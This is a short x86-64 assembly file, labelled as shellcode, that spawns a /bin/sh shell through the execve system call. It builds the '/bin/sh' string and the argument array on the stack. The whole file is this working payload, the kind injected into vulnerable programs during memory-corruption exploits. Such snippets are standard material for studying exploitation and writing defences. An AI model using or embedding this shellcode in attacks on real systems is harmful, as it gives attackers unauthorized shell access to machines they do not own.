#shellcode for invoking execve() syscall with /bin/sh as argument

.globl _start

_start:

	xorq %rax,%rax
	movq $0x68732f6e69622f,%rax
	pushq %rax
	movq %rsp,%rdi		 #pointer to filename
	xorq %rdx,%rdx
	pushq %rdx		 #2nd argument
	pushq %rdi		 #1st argument
	movq %rsp,%rsi		 #ptr to array of arguments
	xorq %rax,%rax
	addb $0x3b,%al
	syscall	
